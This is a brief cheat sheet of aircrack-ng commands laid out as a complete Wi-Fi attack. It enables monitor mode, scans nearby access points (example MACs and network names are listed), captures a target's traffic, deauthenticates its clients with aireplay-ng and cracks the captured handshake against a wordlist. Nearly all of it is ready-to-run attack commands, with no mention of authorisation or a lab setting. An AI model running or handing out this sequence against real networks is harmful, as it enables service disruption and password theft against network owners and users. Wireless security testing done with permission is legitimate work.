### enable monitor mode
```
sudo ifconfig wlan0 down
sudo airmon-ng start wlan0
```



### airodump-ng scanning
```
sudo airodump-ng wlan0mon

# ex)
# 70:5D:CC:65:45:C2 - 305
# 88:36:6C:90:F4:DE - Iptime
# 70:5D:CC:6C:F2:80 - O
# 70:5D:CC:8A:A2:7E - iptime
# 80:4E:81:0A:75:83 - my phone
```


### save traffic packets
```
sudo airodump-ng --bssid 00:00:00:00:00:00 -w 파일 이름 wlan0mon
```


### execute aireplay-ng
```
sudo aireplay-ng --deauth 100 -a 00:00:00:00:00:00 wlan0mon

# ex)
# sudo aireplay-ng --deauth 100 -a 70:5D:CC:65:45:C2 wlan0mon
```


### crack password
```
sudo aircrack-ng filename.cap -w dict.lst
```
